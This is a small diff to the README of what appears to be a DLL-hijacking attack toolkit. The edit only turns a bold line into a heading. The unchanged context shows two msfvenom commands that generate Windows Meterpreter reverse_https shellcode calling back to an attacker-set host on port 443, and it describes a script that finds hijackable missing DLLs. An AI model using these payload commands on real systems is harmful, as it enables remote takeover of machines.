@@ -135,7 +135,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=
 msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw > shellcode.bin
 ```
 
-**Finding vulnerable target executables**
+## Finding vulnerable target executables
 
 check_dll.py scans a single .exe or .msi for potentially hijackable missing DLLs in writable paths, prints findings to stdout, and logs CSV results to a per-target file:
 ```
